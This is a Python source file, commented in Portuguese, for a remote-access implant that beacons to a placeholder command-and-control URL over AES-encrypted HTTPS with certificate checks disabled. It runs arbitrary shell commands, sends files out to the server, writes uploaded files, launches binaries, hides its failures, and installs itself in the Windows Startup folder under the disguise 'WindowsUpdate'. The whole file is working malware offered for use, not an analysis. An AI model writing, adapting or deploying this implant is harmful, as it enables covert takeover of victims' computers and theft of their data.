import uuid
import socket
import platform
import getpass
import requests
import json
import time
import subprocess
import os
import sys
import threading
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64

# Configuração do C2 (IP/DOMÍNIO e PORTA)
C2_URL = "https://SEU_IP_OU_DOMINIO_AQUI:443"
BEACON_INTERVAL = 10  # segundos

# Chave de criptografia (DEVE SER A MESMA DO SERVIDOR)
SECRET_KEY = b'SUA_CHAVE_AES_256_AQUI_32_BYTES_EXATOS'

def encrypt(data):
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    return json.dumps({'iv': iv, 'ciphertext': ct})

def decrypt(enc_data):
    b64 = json.loads(enc_data)
    iv = base64.b64decode(b64['iv'])
    ct = base64.b64decode(b64['ciphertext'])
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt.decode('utf-8')

def get_system_info():
    return {
        'id': str(uuid.getnode()),
        'hostname': socket.gethostname(),
        'os': platform.system() + " " + platform.release(),
        'user': getpass.getuser()
    }

def execute_command(cmd, args={}):
    try:
        if cmd == "shell":
            result = subprocess.run(args.get('cmd', 'whoami'), shell=True, capture_output=True, text=True, timeout=30)
            return result.stdout + result.stderr
        elif cmd == "download":
            filepath = args.get('path', '')
            if os.path.exists(filepath):
                with open(filepath, 'rb') as f:
                    return base64.b64encode(f.read()).decode('utf-8')
            else:
                return "Arquivo não encontrado"
        elif cmd == "upload":
            filepath = args.get('path', 'uploaded_file')
            content = base64.b64decode(args.get('content', ''))
            with open(filepath, 'wb') as f:
                f.write(content)
            return f"Arquivo salvo em {filepath}"
        elif cmd == "exec":
            # Executa binário arbitrário
            binary_path = args.get('binary', '')
            if os.path.exists(binary_path):
                subprocess.Popen([binary_path], shell=True)
                return "Executado em background"
            else:
                return "Binário não encontrado"
        else:
            return "Comando desconhecido"
    except Exception as e:
        return str(e)

def beacon_loop():
    while True:
        try:
            system_info = get_system_info()
            payload = encrypt(json.dumps(system_info))

            response = requests.post(f"{C2_URL}/beacon", json={'data': payload}, verify=False)
            response_data = response.json().get('data')
            tasks = json.loads(decrypt(response_data)).get('tasks', [])

            for task in tasks:
                result = execute_command(task['command'], json.loads(task['args']))
                result_payload = encrypt(json.dumps({
                    'task_id': task['task_id'],
                    'result': result
                }))
                requests.post(f"{C2_URL}/result", json={'data': result_payload}, verify=False)

        except Exception as e:
            pass  # falha silenciosa para persistência

        time.sleep(BEACON_INTERVAL)

# Persistência no Windows (simples)
def setup_persistence():
    if platform.system() == "Windows":
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        script_path = sys.argv[0]
        shortcut_path = os.path.join(startup_folder, "WindowsUpdate.lnk")
        if not os.path.exists(shortcut_path):
            # Cria atalho ou copia o script
            import shutil
            shutil.copyfile(script_path, shortcut_path + ".pyw")  # .pyw para rodar sem console

# Iniciar em thread separada
if __name__ == "__main__":
    setup_persistence()
    threading.Thread(target=beacon_loop, daemon=True).start()
    while True:
        time.sleep(1000)  # manter processo vivo
